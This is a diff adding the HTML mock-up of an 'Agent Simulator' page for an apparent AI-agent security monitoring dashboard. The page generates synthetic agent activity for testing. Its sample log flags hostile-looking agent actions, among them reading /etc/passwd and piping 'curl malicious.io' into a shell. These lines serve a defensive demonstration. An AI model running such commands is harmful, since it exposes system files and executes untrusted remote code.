@@ -1,0 +1,383 @@
+<!DOCTYPE html>
+
+<html class="dark" lang="en"><head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+<title>Agent Simulator - AgentShield AI</title>
+<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Sans:wght@400;600&amp;family=JetBrains+Mono:wght@500;600&amp;display=swap" rel="stylesheet"/>
+<link href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:wght,FILL@100..700,0..1&amp;display=swap" rel="stylesheet"/>
+<link href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:wght,FILL@100..700,0..1&amp;display=swap" rel="stylesheet"/>
+<script src="https://cdn.tailwindcss.com?plugins=forms,container-queries"></script>
+<script id="tailwind-config">
+        tailwind.config = {
+            darkMode: "class",
+            theme: {
+                extend: {
+                    "colors": {
+                        "surface-variant": "#31353c",
+                        "on-tertiary": "#29313a",
+                        "status-success": "#238636",
+                        "error": "#ffb4ab",
+                        "surface-container": "#1c2026",
+                        "surface-bright": "#353940",
+                        "primary": "#a8e8ff",
+                        "surface": "#10141a",
+                        "inverse-on-surface": "#2d3137",
+                        "on-tertiary-container": "#48515a",
+                        "on-primary-fixed": "#001f27",
+                        "secondary-fixed-dim": "#acc7ff",
+                        "outline-variant": "#3c494e",
+                        "on-primary": "#003642",
+                        "tertiary-fixed-dim": "#bec7d2",
+                        "on-primary-container": "#00586b",
+                        "on-tertiary-fixed": "#141c24",
+                        "on-secondary-container": "#f8f8ff",
+                        "tertiary-fixed": "#dae3ee",
+                        "surface-container-highest": "#31353c",
+                        "on-secondary": "#002f68",
+                        "primary-fixed-dim": "#3cd7ff",
+                        "on-background": "#dfe2eb",
+                        "on-error-container": "#ffdad6",
+                        "on-surface": "#dfe2eb",
+                        "surface-container-low": "#181c22",
+                        "on-secondary-fixed": "#001a40",
+                        "background": "#10141a",
+                        "inverse-primary": "#00677e",
+                        "bg-raised": "#1C2128",
+                        "surface-tint": "#3cd7ff",
+                        "primary-container": "#00d4ff",
+                        "error-container": "#93000a",
+                        "tertiary-container": "#bbc4cf",
+                        "primary-fixed": "#b4ebff",
+                        "secondary": "#acc7ff",
+                        "status-danger": "#F85149",
+                        "inverse-surface": "#dfe2eb",
+                        "bg-hover": "#21262D",
+                        "surface-container-lowest": "#0a0e14",
+                        "bg-surface": "#161B22",
+                        "on-primary-fixed-variant": "#004e5f",
+                        "on-secondary-fixed-variant": "#004492",
+                        "text-main": "#E6EDF3",
+                        "on-surface-variant": "#bbc9cf",
+                        "tertiary": "#d7e0eb",
+                        "on-tertiary-fixed-variant": "#3f4850",
+                        "surface-container-high": "#262a31",
+                        "on-error": "#690005",
+                        "border-subtle": "#30363D",
+                        "surface-dim": "#10141a",
+                        "outline": "#859398",
+                        "secondary-container": "#026ee4",
+                        "secondary-fixed": "#d7e2ff",
+                        "status-warning": "#D29922"
+                    },
+                    "borderRadius": {
+                        "DEFAULT": "0.125rem",
+                        "lg": "0.25rem",
+                        "xl": "0.5rem",
+                        "full": "0.75rem"
+                    },
+                    "spacing": {
+                        "margin-page": "24px",
+                        "sidebar-width": "240px",
+                        "base": "8px",
+                        "topbar-height": "64px",
+                        "gutter": "16px"
+                    },
+                    "fontFamily": {
+                        "body-sm": ["IBM Plex Sans"],
+                        "body-md": ["IBM Plex Sans"],
+                        "data-mono": ["JetBrains Mono"],
+                        "button-label": ["JetBrains Mono"],
+                        "headline-md": ["IBM Plex Sans"],
+                        "headline-lg": ["IBM Plex Sans"]
+                    },
+                    "fontSize": {
+                        "body-sm": ["12px", { "lineHeight": "16px", "fontWeight": "400" }],
+                        "body-md": ["14px", { "lineHeight": "20px", "fontWeight": "400" }],
+                        "data-mono": ["13px", { "lineHeight": "18px", "fontWeight": "500" }],
+                        "button-label": ["12px", { "lineHeight": "16px", "letterSpacing": "0.05em", "fontWeight": "600" }],
+                        "headline-md": ["18px", { "lineHeight": "24px", "fontWeight": "600" }],
+                        "headline-lg": ["24px", { "lineHeight": "32px", "fontWeight": "600" }]
+                    }
+                }
+            }
+        }
+    </script>
+<style>
+        .pulse-critical {
+            animation: pulse-op 2s cubic-bezier(0.4, 0, 0.6, 1) infinite;
+        }
+        @keyframes pulse-op {
+            0%, 100% { opacity: 1; }
+            50% { opacity: .5; }
+        }
+        .glow-cyan {
+            box-shadow: 0 0 8px rgba(0, 212, 255, 0.4);
+        }
+        ::-webkit-scrollbar { width: 8px; height: 8px; }
+        ::-webkit-scrollbar-track { background: #10141a; }
+        ::-webkit-scrollbar-thumb { background: #30363D; border-radius: 4px; }
+        ::-webkit-scrollbar-thumb:hover { background: #48515a; }
+    </style>
+</head>
+<body class="bg-[#0D1117] text-on-surface font-body-md min-h-screen overflow-hidden">
+<!-- TopNavBar Component -->
+<nav class="h-topbar-height fixed top-0 right-0 z-40 border-b border-border-subtle bg-surface dark:bg-surface flex justify-between items-center px-gutter w-[calc(100%-240px)] ml-[240px] hidden md:flex">
+<div class="flex items-center space-x-6">
+<span class="font-headline-md text-headline-md font-bold text-primary dark:text-primary uppercase">AGENTSHIELD AI</span>
+<!-- Search Bar (on_left) -->
+<div class="relative hidden lg:block ml-4">
+<span class="material-symbols-outlined absolute left-3 top-1/2 -translate-y-1/2 text-on-surface-variant text-sm">search</span>
+<input class="bg-[#0D1117] border border-border-subtle text-on-surface font-data-mono text-data-mono rounded h-8 pl-9 pr-4 focus:outline-none focus:border-primary focus:ring-1 focus:ring-primary focus:glow-cyan w-64 transition-all" placeholder="Search..." type="text"/>
+</div>
+</div>
+<div class="flex items-center space-x-6">
+<div class="flex space-x-4">
+<a class="font-button-label text-button-label text-on-surface-variant hover:text-primary-container transition-opacity duration-200" href="#">LIVE FEED</a>
+<a class="font-button-label text-button-label text-on-surface-variant hover:text-primary-container transition-opacity duration-200" href="#">NETWORK</a>
+<a class="font-button-label text-button-label text-on-surface-variant hover:text-primary-container transition-opacity duration-200" href="#">SENSORS</a>
+</div>
+<div class="flex items-center space-x-3 text-on-surface-variant border-l border-border-subtle pl-6">
+<button class="hover:text-primary transition-colors hover:scale-95 duration-100"><span class="material-symbols-outlined text-[20px]">notifications_active</span></button>
+<button class="hover:text-primary transition-colors hover:scale-95 duration-100"><span class="material-symbols-outlined text-[20px]">dns</span></button>
+<button class="hover:text-primary transition-colors hover:scale-95 duration-100"><span class="material-symbols-outlined text-[20px]">schedule</span></button>
+</div>
+<button class="bg-primary text-on-primary-fixed font-button-label text-button-label px-4 py-1.5 rounded uppercase hover:bg-primary-container transition-colors glow-cyan active:scale-95 duration-100">DEPLOY AGENT</button>
+<div class="w-8 h-8 rounded bg-surface-variant border border-border-subtle overflow-hidden flex items-center justify-center">
+<span class="material-symbols-outlined text-on-surface-variant">person</span>
+</div>
+</div>
+</nav>
+<!-- SideNavBar Component -->
+<aside class="w-sidebar-width h-screen fixed left-0 top-0 border-r border-border-subtle bg-background dark:bg-background flex flex-col py-base z-50">
+<div class="px-gutter pb-6 mb-2 border-b border-border-subtle pt-2 flex flex-col items-start">
+<div class="flex items-center space-x-3 mb-4">
+<div class="w-10 h-10 rounded bg-primary-container flex items-center justify-center glow-cyan">
+<span class="material-symbols-outlined text-on-primary-fixed" data-weight="fill">shield_locked</span>
+</div>
+<div>
+<h1 class="font-button-label text-button-label uppercase tracking-widest text-primary dark:text-primary">AGENTSHIELD</h1>
+<span class="font-data-mono text-[10px] text-on-surface-variant uppercase tracking-wider block mt-0.5">MISSION CONTROL</span>
+</div>
+</div>
+<button class="w-full bg-surface-variant border border-border-subtle text-on-surface font-button-label text-button-label py-2 rounded hover:border-primary hover:text-primary transition-colors flex items-center justify-center space-x-2">
+<span class="material-symbols-outlined text-[16px]">add</span>
+<span>NEW SCAN</span>
+</button>
+</div>
+<nav class="flex-1 overflow-y-auto mt-2">
+<ul class="flex flex-col space-y-1">
+<li>
+<a class="flex items-center px-gutter py-2.5 font-body-md text-body-md text-on-surface-variant dark:text-on-surface-variant hover:bg-bg-hover hover:text-on-surface transition-colors duration-200" href="#">
+<span class="material-symbols-outlined mr-3 text-[20px]">dashboard</span>
+                        Dashboard
+                    </a>
+</li>
+<li>
+<a class="flex items-center px-gutter py-2.5 font-body-md text-body-md text-on-surface-variant dark:text-on-surface-variant hover:bg-bg-hover hover:text-on-surface transition-colors duration-200" href="#">
+<span class="material-symbols-outlined mr-3 text-[20px]">smart_toy</span>
+                        Agents
+                    </a>
+</li>
+<li>
+<a class="flex items-center px-gutter py-2.5 font-body-md text-body-md text-on-surface-variant dark:text-on-surface-variant hover:bg-bg-hover hover:text-on-surface transition-colors duration-200" href="#">
+<span class="material-symbols-outlined mr-3 text-[20px]">notification_important</span>
+                        Alerts
+                    </a>
+</li>
+<li>
+<a class="flex items-center px-gutter py-2.5 font-body-md text-body-md text-on-surface-variant dark:text-on-surface-variant hover:bg-bg-hover hover:text-on-surface transition-colors duration-200" href="#">
+<span class="material-symbols-outlined mr-3 text-[20px]">gavel</span>
+                        Rules
+                    </a>
+</li>
+<li>
+<a class="flex items-center px-gutter py-2.5 font-body-md text-body-md text-primary dark:text-primary bg-bg-hover border-r-2 border-primary bg-bg-raised transition-all duration-150 hover:bg-bg-hover hover:text-on-surface transition-colors duration-200" href="#">
+<span class="material-symbols-outlined mr-3 text-[20px]" data-weight="fill">terminal</span>
+                        Logs
+                    </a>
+</li>
+<li>
+<a class="flex items-center px-gutter py-2.5 font-body-md text-body-md text-on-surface-variant dark:text-on-surface-variant hover:bg-bg-hover hover:text-on-surface transition-colors duration-200" href="#">
+<span class="material-symbols-outlined mr-3 text-[20px]">settings</span>
+                        Settings
+                    </a>
+</li>
+</ul>
+</nav>
+<div class="mt-auto border-t border-border-subtle pt-4 px-2">
+<ul class="flex flex-col space-y-1">
+<li>
+<a class="flex items-center px-3 py-2 font-body-sm text-body-sm text-on-surface-variant hover:text-on-surface transition-colors" href="#">
+<span class="material-symbols-outlined mr-2 text-[16px]">help</span>
+                        Support
+                    </a>
+</li>
+<li>
+<a class="flex items-center px-3 py-2 font-body-sm text-body-sm text-on-surface-variant hover:text-on-surface transition-colors" href="#">
+<span class="material-symbols-outlined mr-2 text-[16px]">menu_book</span>
+                        User Guide
+                    </a>
+</li>
+</ul>
+</div>
+</aside>
+<!-- Main Content Area -->
+<main class="ml-sidebar-width pt-topbar-height p-margin-page h-screen overflow-y-auto flex flex-col space-y-6">
+<!-- Page Header -->
+<header>
+<h2 class="font-headline-lg text-headline-lg text-primary-container font-bold tracking-tight">Agent Simulator</h2>
+<p class="font-body-md text-body-md text-[#8B949E] mt-1">Generate synthetic agent activity for testing and demonstration</p>
+</header>
+<!-- Top Controls Row -->
+<section class="bg-bg-raised border border-border-subtle rounded p-4 flex flex-wrap items-end gap-6 shadow-sm">
+<div class="flex flex-col space-y-1.5">
+<label class="font-button-label text-button-label text-on-surface-variant uppercase">Active Agents</label>
+<div class="relative">
+<input class="bg-[#0D1117] border border-border-subtle text-on-surface font-data-mono text-data-mono rounded h-9 w-24 px-3 focus:outline-none focus:border-primary focus:ring-1 focus:ring-primary focus:glow-cyan transition-colors" max="50" min="1" type="number" value="5"/>
+</div>
+</div>
+<div class="flex flex-col space-y-1.5">
+<label class="font-button-label text-button-label text-on-surface-variant uppercase">Scenario</label>
+<select class="bg-[#0D1117] border border-border-subtle text-on-surface font-body-md text-body-md rounded h-9 pl-3 pr-8 focus:outline-none focus:border-primary focus:ring-1 focus:ring-primary focus:glow-cyan transition-colors appearance-none bg-[url('data:image/svg+xml;charset=US-ASCII,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20width%3D%2224%22%20height%3D%2224%22%20viewBox%3D%220%200%2024%2024%22%20fill%3D%22none%22%20stroke%3D%22%23859398%22%20stroke-width%3D%222%22%20stroke-linecap%3D%22round%22%20stroke-linejoin%3D%22round%22%3E%3Cpolyline%20points%3D%226%209%2012%2015%2018%209%22%3E%3C%2Fpolyline%3E%3C%2Fsvg%3E')] bg-no-repeat bg-[position:right_0.5rem_center] bg-[length:1.2em_1.2em]">
+<option>Normal Workflow</option>
+<option>Threat Injection</option>
+<option>Mixed Behaviour</option>
+<option>API Flood Attack</option>
+<option>File Traversal Attack</option>
+</select>
+</div>
+<div class="flex flex-col space-y-1.5 flex-1 min-w-[200px]">
+<div class="flex justify-between items-center">
+<label class="font-button-label text-button-label text-on-surface-variant uppercase">Actions Per Minute</label>
+<span class="font-data-mono text-data-mono text-primary">60</span>
+</div>
+<input class="w-full h-1.5 bg-[#0D1117] rounded-lg appearance-none cursor-pointer accent-primary border border-border-subtle mt-1.5" max="200" min="1" type="range" value="60"/>
+</div>
+<div class="flex space-x-3 ml-auto">
+<button class="bg-status-success text-on-surface font-button-label text-button-label px-5 h-9 rounded uppercase flex items-center space-x-2 hover:opacity-90 active:scale-95 transition-all shadow-[0_0_10px_rgba(35,134,54,0.3)]">
+<span class="material-symbols-outlined text-[18px]">play_arrow</span>
+<span>Start Simulation</span>
+</button>
+<button class="bg-transparent border border-status-danger text-status-danger font-button-label text-button-label px-4 h-9 rounded uppercase flex items-center space-x-2 hover:bg-[#F85149]/10 active:scale-95 transition-all">
+<span class="material-symbols-outlined text-[18px]">stop</span>
+<span>Stop</span>
+</button>
+</div>
+</section>
+<!-- Status Row -->
+<section class="flex flex-wrap gap-3">
+<div class="bg-bg-raised border border-border-subtle border-l-2 border-l-status-success rounded px-3 py-1.5 flex items-center space-x-3 shadow-sm">
+<div class="w-2 h-2 rounded-full bg-status-success glow-cyan"></div>
+<span class="font-data-mono text-data-mono text-on-surface">AGT-001</span>
+<span class="font-data-mono text-[11px] text-on-surface-variant bg-[#0D1117] px-1.5 rounded border border-border-subtle">12 a/m</span>
+</div>
+<div class="bg-bg-raised border border-border-subtle border-l-2 border-l-status-success rounded px-3 py-1.5 flex items-center space-x-3 shadow-sm">
+<div class="w-2 h-2 rounded-full bg-status-success glow-cyan"></div>
+<span class="font-data-mono text-data-mono text-on-surface">AGT-002</span>
+<span class="font-data-mono text-[11px] text-on-surface-variant bg-[#0D1117] px-1.5 rounded border border-border-subtle">14 a/m</span>
+</div>
+<div class="bg-bg-raised border border-border-subtle border-l-2 border-l-status-warning rounded px-3 py-1.5 flex items-center space-x-3 shadow-sm">
+<div class="w-2 h-2 rounded-full bg-status-warning"></div>
+<span class="font-data-mono text-data-mono text-on-surface">AGT-003</span>
+<span class="font-data-mono text-[11px] text-on-surface-variant bg-[#0D1117] px-1.5 rounded border border-border-subtle">28 a/m</span>
+</div>
+<div class="bg-bg-raised border border-border-subtle border-l-2 border-l-status-danger rounded px-3 py-1.5 flex items-center space-x-3 shadow-sm">
+<div class="w-2 h-2 rounded-full bg-status-danger pulse-critical"></div>
+<span class="font-data-mono text-data-mono text-on-surface">AGT-004</span>
+<span class="font-data-mono text-[11px] text-on-surface-variant bg-[#0D1117] px-1.5 rounded border border-border-subtle">0 a/m</span>
+</div>
+<div class="bg-bg-raised border border-border-subtle border-l-2 border-l-status-success rounded px-3 py-1.5 flex items-center space-x-3 shadow-sm">
+<div class="w-2 h-2 rounded-full bg-status-success glow-cyan"></div>
+<span class="font-data-mono text-data-mono text-on-surface">AGT-005</span>
+<span class="font-data-mono text-[11px] text-on-surface-variant bg-[#0D1117] px-1.5 rounded border border-border-subtle">11 a/m</span>
+</div>
+</section>
+<!-- Main Content Area (50/50 Split) -->
+<div class="flex-1 grid grid-cols-1 lg:grid-cols-2 gap-6 min-h-0 pb-6">
+<!-- Left: Simulation Log -->
+<div class="bg-[#0D1117] border border-[#238636]/30 rounded flex flex-col relative overflow-hidden shadow-sm">
+<div class="bg-bg-raised border-b border-border-subtle px-4 py-2 flex justify-between items-center z-10">
+<h3 class="font-button-label text-button-label uppercase text-on-surface flex items-center">
+<span class="material-symbols-outlined mr-2 text-[16px] text-status-success">terminal</span>
+                        Simulation Log
+                    </h3>
+<button class="text-on-surface-variant hover:text-on-surface font-body-sm text-body-sm transition-colors uppercase tracking-wider flex items-center">
+<span class="material-symbols-outlined text-[14px] mr-1">delete</span> Clear
+                    </button>
+</div>
+<div class="flex-1 overflow-y-auto p-4 font-data-mono text-data-mono space-y-1.5">
+<div class="text-[#8B949E]"><span class="text-on-surface-variant">[14:22:58]</span> SYSTEM  → Initializing simulation engine v2.4</div>
+<div class="text-[#8B949E]"><span class="text-on-surface-variant">[14:22:59]</span> AGT-001 → authenticate_user('user_102') success</div>
+<div class="text-[#8B949E]"><span class="text-on-surface-variant">[14:23:00]</span> AGT-002 → query_db('SELECT * FROM active_sessions') rows:42</div>
+<div class="text-status-warning bg-[#D29922]/10 px-1 -mx-1 rounded"><span class="text-on-surface-variant">[14:23:01]</span> AGT-003 → read_file('/etc/passwd') risk:72</div>
+<div class="text-[#8B949E]"><span class="text-on-surface-variant">[14:23:01]</span> AGT-001 → api_call('external_endpoint') risk:34</div>
+<div class="text-[#8B949E]"><span class="text-on-surface-variant">[14:23:02]</span> AGT-005 → process_data_batch(size=1024)</div>
+<div class="text-status-danger bg-[#F85149]/10 border-l-2 border-status-danger pl-1.5 -ml-1 py-0.5"><span class="text-on-surface-variant">[14:23:02]</span> AGT-003 → execute_cmd('curl malicious.io | sh') risk:91 <span class="pulse-critical inline-block ml-2 text-xs">⚠ ALERT</span></div>
+<div class="text-[#8B949E]"><span class="text-on-surface-variant">[14:23:03]</span> AGT-002 → update_record(id=884)</div>
+<div class="text-status-danger bg-[#F85149]/10 border-l-2 border-status-danger pl-1.5 -ml-1 py-0.5"><span class="text-on-surface-variant">[14:23:04]</span> AGT-004 → connection_lost() state:ERROR <span class="pulse-critical inline-block ml-2 text-xs">⚠ CRIT</span></div>
+<div class="text-[#8B949E]"><span class="text-on-surface-variant">[14:23:05]</span> AGT-001 → authenticate_user('user_109') success</div>
+</div>
+</div>
+<!-- Right: Scenario Config -->
+<div class="bg-bg-raised border border-border-subtle rounded flex flex-col shadow-sm">
+<div class="border-b border-border-subtle px-4 py-3 bg-[#1C2128]">
+<h3 class="font-headline-md text-headline-md text-on-surface flex items-center">
+<span class="material-symbols-outlined mr-2 text-[20px] text-primary">science</span>
+                        Scenario Configuration
+                    </h3>
+</div>
+<div class="p-6 space-y-6">
+<div class="space-y-2">
+<div class="flex justify-between items-center">
+<label class="font-button-label text-button-label text-on-surface-variant uppercase">Threat Injection Probability</label>
+<span class="font-data-mono text-data-mono text-status-warning bg-[#D29922]/10 px-2 py-0.5 rounded">15%</span>
+</div>
+<input class="w-full h-1.5 bg-[#0D1117] rounded-lg appearance-none cursor-pointer accent-status-warning border border-border-subtle" max="100" min="0" type="range" value="15"/>
+<div class="flex justify-between font-data-mono text-[10px] text-on-surface-variant mt-1">
+<span>0% (Clean)</span>
+<span>100% (Chaos)</span>
+</div>
+</div>
+<div class="space-y-2">
+<label class="font-button-label text-button-label text-on-surface-variant uppercase block">Target Agent</label>
+<select class="w-full bg-[#0D1117] border border-border-subtle text-on-surface font-body-md text-body-md rounded h-10 px-3 focus:outline-none focus:border-primary focus:ring-1 focus:ring-primary focus:glow-cyan transition-colors appearance-none bg-[url('data:image/svg+xml;charset=US-ASCII,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20width%3D%2224%22%20height%3D%2224%22%20viewBox%3D%220%200%2024%2024%22%20fill%3D%22none%22%20stroke%3D%22%23859398%22%20stroke-width%3D%222%22%20stroke-linecap%3D%22round%22%20stroke-linejoin%3D%22round%22%3E%3Cpolyline%20points%3D%226%209%2012%2015%2018%209%22%3E%3C%2Fpolyline%3E%3C%2Fsvg%3E')] bg-no-repeat bg-[position:right_0.75rem_center] bg-[length:1.2em_1.2em]">
+<option>All Active Agents</option>
+<option>AGT-001</option>
+<option>AGT-002</option>
+<option>AGT-003</option>
+<option>AGT-005</option>
+</select>
+</div>
+<div class="space-y-3">
+<label class="font-button-label text-button-label text-on-surface-variant uppercase block border-b border-border-subtle pb-1">Inject Threat Types</label>
+<div class="grid grid-cols-1 sm:grid-cols-2 gap-3 mt-3">
+<label class="flex items-center space-x-3 p-2 bg-[#0D1117] border border-border-subtle rounded cursor-pointer hover:border-primary/50 transition-colors">
+<input checked="" class="form-checkbox text-primary rounded-sm bg-surface-variant border-border-subtle focus:ring-primary focus:ring-offset-0 focus:ring-offset-transparent" type="checkbox"/>
+<span class="font-body-sm text-body-sm text-on-surface">File Access Violation</span>
+</label>
+<label class="flex items-center space-x-3 p-2 bg-[#0D1117] border border-border-subtle rounded cursor-pointer hover:border-primary/50 transition-colors">
+<input checked="" class="form-checkbox text-primary rounded-sm bg-surface-variant border-border-subtle focus:ring-primary focus:ring-offset-0 focus:ring-offset-transparent" type="checkbox"/>
+<span class="font-body-sm text-body-sm text-on-surface">API Flood</span>
+</label>
+<label class="flex items-center space-x-3 p-2 bg-[#0D1117] border border-border-subtle rounded cursor-pointer hover:border-primary/50 transition-colors">
+<input class="form-checkbox text-primary rounded-sm bg-surface-variant border-border-subtle focus:ring-primary focus:ring-offset-0 focus:ring-offset-transparent" type="checkbox"/>
+<span class="font-body-sm text-body-sm text-on-surface">Prompt Injection</span>
+</label>
+<label class="flex items-center space-x-3 p-2 bg-[#0D1117] border border-border-subtle rounded cursor-pointer hover:border-primary/50 transition-colors">
+<input class="form-checkbox text-primary rounded-sm bg-surface-variant border-border-subtle focus:ring-primary focus:ring-offset-0 focus:ring-offset-transparent" type="checkbox"/>
+<span class="font-body-sm text-body-sm text-on-surface">Privilege Escalation</span>
+</label>
+</div>
+</div>
+<div class="pt-4 border-t border-border-subtle mt-auto">
+<button class="w-full bg-status-danger text-on-surface font-button-label text-button-label py-3 rounded uppercase flex items-center justify-center space-x-2 hover:bg-status-danger/90 active:scale-[0.98] transition-all shadow-[0_0_15px_rgba(248,81,73,0.2)]">
+<span class="material-symbols-outlined text-[18px]">bolt</span>
+<span>Inject Threat Now</span>
+</button>
+</div>
+</div>
+</div>
+</div>
+</main>
+</body></html>
